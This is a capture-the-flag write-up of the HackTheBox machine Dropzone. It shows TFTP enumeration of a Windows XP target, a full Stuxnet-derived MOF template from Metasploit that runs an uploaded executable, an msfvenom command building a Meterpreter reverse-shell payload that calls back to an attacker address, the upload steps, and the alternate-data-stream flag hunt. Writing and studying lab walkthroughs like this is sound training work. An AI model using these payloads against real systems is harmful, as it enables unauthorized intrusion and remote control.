---
title: "HackTheBox Writeup: Dropzone"
date: 2019-08-31T04:46:29+02:00
toc: true
showdate: true
---

{{%summary%}}
![img](/images/dropzone-writeup/1.png)
{{%/summary%}}

As one of my very first difficult boxes on the website Dropzone was relatively easy, more like a medium difficulty box. The difficult part of this challenge is its very little attack surface, which can only be exploited with a technique not many may know about because is no longer useful in modern systems. Once figured out what to do, the whole exploitation phase is trivial. Despite this, Dropzone still taught me a lot because the research that led me to the right solution was very informative and it answered a few questions I always had, in fact I'm going to write a full post on the subject.

---

## Enumeration

An initial nmap scan fails to find any open ports but at least the host is reported as up so it does accept ICMP traffic:

```shell-session
┌─[✗]─[baud@parrot]─[~/dropzone]
└──╼ $sudo nmap -sC -sV -oA nmap 10.10.10.90
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-30 17:56 CEST
Nmap scan report for 10.10.10.90
Host is up (0.023s latency).
All 1000 scanned ports on 10.10.10.90 are filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
```

Because by default nmap doesn't scan UDP ports I run a new scan only for UDP, this scan is much slower because of the nature of UDP scans but I do get one result back, TFTP is running on port 69:

```shell-session
┌─[baud@parrot]─[~/dropzone]
└──╼ $sudo nmap -sU -oA nmap-udp 10.10.10.90
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-30 17:57 CEST
Nmap scan report for 10.10.10.90
Host is up (0.080s latency).
Not shown: 999 open|filtered ports
PORT   STATE SERVICE
69/udp open  tftp
```

TFTP stands for Trivial File Transfer Protocol and is literally a highly simplified version of FTP reduced to its barebones so many features are missing, for example there is no authentication, so we can login with a simple client:

```shell-session
┌─[baud@parrot]─[~/dropzone]
└──╼ $tftp 10.10.10.90
tftp>
```

In TFTP it's also impossible to navigate through directories, clients must know in advance where exactly the files they wish to download are located on the server. For example, if we wanted to grab the SAM database:

```shell-session
tftp> get /windows/system32/config/SAM
Error code 1: The process cannot access the file 'C:\windows\system32\config\SAM' because it is being used by another process.
```

We can't download it but not for the reason one would expect, we have enough permissions to access it but it's being used by another process, this means we are already running as SYSTEM. From TFTP one can make a few assumptions on the system based on the errors it returns, for example, we can assume the box is running Windows XP because the Users directory doesn't exist:

```shell-session
tftp> get /users
Error code 1: Could not find file 'C:\users'.
```

The error message is different than the one we get if we access a directory that exists, like Windows:

```shell-session
tftp> get /windows
Error code 1: Access to the path 'C:\windows' is denied.
```

We could confirm that the operating system is XP by trying to *get* the Documents and Settings folder but the directory name is split in three because of the space characters:

```shell-session
tftp> get "/documents and settings"
Error code 0: Bailing out to bad characters in filename: '"\documents'.
Error code 1: Could not find file 'C:\and'.
Error code 0: Bailing out to bad characters in filename: 'settings"'.
```

A workaround is using the short name notation supported in older versions of Windows and born with DOS, back when older FAT filesystems only supported short file names. By appending a "~1" to the first six letters of a file or folder the operating system will look for the first match in the directory tree, so for example "Docume~1" will return "Documents and Settings" because there are no other files or folders beginning with "Docume" in the root of the file system:

```shell-session
tftp> get /Docume~1
Error code 1: Access to the path 'C:\Documents and Settings' is denied.
```

Another test based on errors we can make is determining the bits of the OS, by checking the presence of the two folders Program Files and Program Files (x86):

```shell-session
tftp> get /progra~1
Error code 1: Access to the path 'C:\Program Files' is denied.
tftp> get /progra~2
Error code 1: Could not find file 'C:\progra~2'.
```

The first entry is found correctly and is Program Files but the second doesn't resolve at all because there isn't a second folder beginning with "Progra" in the root, so it is a 32 bits system because the (x86) equivalent of the Program Files folder doesn't exist. So the overall picture is this: we have a 32 bits Windows XP target with only one service running, TFTP, which is being run as SYSTEM. Being SYSTEM allows us to have read and write rights over the whole disk so we can upload and download files wherever we want, as long as they aren't being used by other processes as we saw with the SAM database. 

## From arbitrary file write to RCE with MOF files

Being able to write files is a good advantage, but we need a way to turn this privilege into actual code execution. The one utility that comes to mind when thinking about remote code execution and arbitrary file write is PSExec, from sysinternals. To make it incredibly short, what PSExec does is saving and launching a Windows service on a remote host, using a named pipe for communication between the service and PSExec itself, the input and output streams are also managed by the service to control the program the user wanted to launch remotely, allowing it to obtain its output and passing it new input coming from PSExec. Unfortunately, the way PSExec launches the service is not of much use to us, PSExec uses the Windows Service Control Manager's API (SCM). SCM is a Remote Procedure Call (RPC) server so it needs port 135 open on the host, since 135 is the default port for the MS-RPC mapper.

However, I did notice something very interesting while analysing the source code of Metasploit's psexec module (/usr/share/metasploit-framework/modules/exploits/windows/smb/psexec.rb):

```ruby
'Targets'        =>
[
[ 'Automatic', { } ],
[ 'PowerShell', { } ],
[ 'Native upload', { } ],
[ 'MOF upload', { } ]
],
'DefaultTarget'  => 0,
```

This snippet of code shows all the different modes the module has to upload and execute an arbitrary executable file on the system. I will examine the PowerShell and native upload options in my post dedicated to PSExec, what interested me is that last target: "MOF upload", something I had never heard before. Looking for information on this technique I run into this [exellent blog post](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html) that I recommend reading, explaining in detail how files with a .mof extension are source files compiled automatically by Windows Management Instrumentation (WMI) and scheduled for execution when a specified event takes place (read the blog post for an in depth coverage). .mof files are compiled automatically when they are dropped in \windows\system32\wbem\mof\, which means this technique can only be used when we already have at the very least access as Administrator, but we are already SYSTEM and can use a TFTP server so we have nothing to fear. The biggest restriction of this method is that Windows versions starting from Vista no longer compile .mof files, as they expect these files to be dropped on the system *after* being compiled, making it no longer usable. This method was made public after it was found being used in the wild by Stuxnet, in couple with a printer spooler exploit: stuxnet uploaded its main module inside System32 and then a .mof file that would launch said module when compiled. This is going to be our same approach.

Metasploit's psexec module imports yet another module to craft a .mof file:

```ruby
include Msf::Exploit::WbemExec
```

The name of the module is WbemExec because WMI is an implementation of Web-Based Enterprise Management (WEBM). The code of this module is at /usr/share/metasploit-framework/lib/msf/core/exploit/wbemexec.rb and is pretty short I'm posting it as a whole:

```ruby
┌─[baud@parrot]─[~/dropzone]
└──╼ $cat /usr/share/metasploit-framework/lib/msf/core/exploit/wbemexec.rb
# -*- coding: binary -*-

#
# This mixin enables executing arbitrary commands via the
# Windows Management Instrumentation service.
#
# By writing the output of these methods to %SystemRoot%\system32\WBEM\mof,
# your command line will be executed.
#
# This technique was used as part of Stuxnet and further reverse engineered
# to this form by Ivanlef0u and jduck.
#

module Msf
module Exploit::WbemExec

def generate_mof(mofname, exe)

classname = rand(0xffff).to_s

# From Ivan's decompressed version
mof = <<-EOT
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass@CLASS@
{
	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
	[key] string Name;
	[not_null] string ScriptingEngine;
	string ScriptFileName;
	[template] string ScriptText;
	uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
	Name  = "ActiveScriptEventConsumer";
	CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
	PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
	Provider = $P;
	ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
	Name = "ASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
	
};
Instance of ActiveScriptEventConsumer as $cons2
{
	Name = "qndASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
	Name = "instfilt";
	Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
	QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
	Name = "qndfilt";
	Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
	QueryLanguage = "WQL";
	
};
instance of __FilterToConsumerBinding as $bind
{
	Consumer = $cons;
	Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
	Consumer = $cons2;
	Filter = $Filt2;
};
instance of MyClass@CLASS@ as $MyClass
{
	Name = "ClassConsumer";
};
EOT

# Replace the input vars
mof.gsub!(/@CLASS@/, classname)
mof.gsub!(/@EXE@/, exe)  # NOTE: \ and " should be escaped

mof
end

end
end
```

It contains only a single function, *generate_mof*, and all it does is taking two file names as input, one for the output .mof file, and one for the executable to launch (usually Meterpreter). The name of the executable to launch isn't absolute because the module uploads it by default inside System32, just like Stuxnet did, so that the system could find the program by itself by looking into the entries from the %PATH% environment variable, which of course includes System32. 

These two strings taken as input by the function are replaced inside the template of a premade .mof source, reconstructed from the one used by Stuxnet. So basically the function does nothing but replacing strings and returning the resulting code. A random number is also generated to append to the definition of the MyClass instance, maybe for defeating simple signature based detection? To create our own functional .mof file to upload on the box we can either replace all the strings manually with our own, or we can enter Ruby's interactive mode to execute the function with arbitrary parameters and grab its output by passing the function to *puts*. First we must be able to access the function though so we have to tell Metasploit to use the psexec module:

```cpp
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > irb
[*] Starting IRB shell...
[*] You are in exploit/windows/smb/psexec

>> puts(generate_mof("baud.mof","dropzone.exe"))
#pragma namespace("\\\\.\\root\\cimv2")
class MyClass89
{
	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
	[key] string Name;
	[not_null] string ScriptingEngine;
	string ScriptFileName;
	[template] string ScriptText;
	uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
	Name  = "ActiveScriptEventConsumer";
	CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
	PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
	Provider = $P;
	ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
	Name = "ASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"dropzone.exe\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass89\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");} catch (err) {};try {sv.Delete(\"ActiveScriptEventConsumer.Name='ASEC'\");} catch(err) {};";
	
};
Instance of ActiveScriptEventConsumer as $cons2
{
	Name = "qndASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\nvar objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\ntry {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\baud.mof\");\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\"dropzone.exe\");\nf2.Delete(true);\nvar s = GetObject(\"winmgmts:root\\\\cimv2\");s.Delete(\"__EventFilter.Name='qndfilt'\");s.Delete(\"ActiveScriptEventConsumer.Name='qndASEC'\");\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
	Name = "instfilt";
	Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass89\"";
	QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
	Name = "qndfilt";
	Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"dropzone.exe\"";
	QueryLanguage = "WQL";
	
};
instance of __FilterToConsumerBinding as $bind
{
	Consumer = $cons;
	Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
	Consumer = $cons2;
	Filter = $Filt2;
};
instance of MyClass89 as $MyClass
{
	Name = "ClassConsumer";
};
=> nil
```

We can copy this code and put it into a new file with .mof extension, then we can create a Meterpreter payload with msfvenom with the same name used in the call to generate_mof:

```shell-session
┌─[baud@parrot]─[~/dropzone]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=9999 -f exe -o dropzone.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: dropzone.exe
```

Once started a listener on Metasploit to receive the incoming connection from the box we can upload both files, first the executable inside System32 after entering binary mode (ASCII mode is the default and would transfer the program in an incorrect format), then the .mof file:

```shell-session
tftp> binary
tftp> put dropzone.exe /windows/system32/dropzone.exe
Sent 73802 bytes in 9.3 seconds
tftp> put baud.mof /windows/system32/wbem/mof/baud.mof
Sent 2219 bytes in 0.3 seconds
tftp>
```

The handler we had set up on Metasploit gives us a Meterpreter session within a couple seconds:

```shell-session
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.37:9999
[*] Sending stage (179779 bytes) to 10.10.10.90
[*] Meterpreter session 1 opened (10.10.14.37:9999 -> 10.10.10.90:1035) at 2019-08-31 01:47:45 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DROPZONE
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

---

## Hunting for flags: alternate data streams

Now we can navigate freely on the disk to go see where the flags are, on the Administrator's desktop are a "flags" folder and a fake root.txt:

```shell-session
C:\Documents and Settings\Administrator\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 7CF6-55F6

Directory of C:\Documents and Settings\Administrator\Desktop

30/08/2019  09:32 ��    <DIR>          .
30/08/2019  09:32 ��    <DIR>          ..
30/08/2019  09:23 ��    <DIR>          flags
10/05/2018  10:12 ��                31 root.txt
1 File(s)             31 bytes
3 Dir(s)   7.240.634.368 bytes free

c:\documents and settings\administrator\desktop>more root.txt
more root.txt
It's easy, but not THAT easy...
```

The flags folder has yet another text file that apparently doesn't tell us anything useful, except for one little detail:

```shell-session
C:\Documents and Settings\Administrator\Desktop\flags>more "2 for the price of 1!.txt"
more "2 for the price of 1!.txt"
For limited time only!

Keep an eye on our ADS for new offers & discounts!
```

That "ADS" is a hint, it stands for Alternate Data Stream, an NTFS feature commonly used to hide files inside others. Usually, one can confirm the presence of alternate data streams on files by using *dir* from a command prompt, without the need of downloading any third party software. However because this is an old version of Windows the flag for that is not present:

```shell-session
c:\documents and settings\administrator\desktop>dir /?
dir /?
Displays a list of files and subdirectories in a directory.

DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N]
[/O[[:]sortorder]] [/P] [/Q] [/S] [/T[[:]timefield]] [/W] [/X] [/4]

[drive:][path][filename]
Specifies drive, directory, and/or files to list.

/A          Displays files with specified attributes.
attributes   D  Directories                R  Read-only files
H  Hidden files               A  Files ready for archiving
S  System files               -  Prefix meaning not
/B          Uses bare format (no heading information or summary).
/C          Display the thousand separator in file sizes.  This is the
default.  Use /-C to disable display of separator.
/D          Same as wide but files are list sorted by column.
/L          Uses lowercase.
/N          New long list format where filenames are on the far right.
/O          List by files in sorted order.
sortorder    N  By name (alphabetic)       S  By size (smallest first)
E  By extension (alphabetic)  D  By date/time (oldest first)
G  Group directories first    -  Prefix to reverse order
/P          Pauses after each screenful of information.
/Q          Display the owner of the file.
/S          Displays files in specified directory and all subdirectories.
/T          Controls which time field displayed or used for sorting
timefield   C  Creation
A  Last Access
W  Last Written
/W          Uses wide list format.
/X          This displays the short names generated for non-8dot3 file
names.  The format is that of /N with the short name inserted
before the long name. If no short name is present, blanks are
displayed in its place.
/4          Displays four-digit years

Switches may be preset in the DIRCMD environment variable.  Override
preset switches by prefixing any switch with - (hyphen)--for example, /-W.
```

Otherwise it would show up as /R, for example in Windows 10:

![img](/images/dropzone-writeup/2.png)

So the closest thing to that we can have is sysinternals' streams.exe, which can be launched after uploading it with the *upload* Meterpreter command. I have used the -s flag for recursion and -d for stripping the alternate streams off the files, they will be showed on screen if found:

![img](/images/dropzone-writeup/3.png)

The text file inside *flags* had two different alternate streams, one for each flags, which got displayed by streams.exe.

---

## Next up: an in-depth look at PSExec and its implementations

Reading all the code for the various psexec modules was very interesting, one can learn a lot from scrolling through the tools we use on a daily basis, one of the best things about this field for me is the fact that there is always something new and exciting to learn, so, in the hope of helping other curious security enthusiasts such as myself I will be sharing all the notes I accumulated on the topic, I only need some time to organize them all and make some more research to make it a complete and worthwile post.
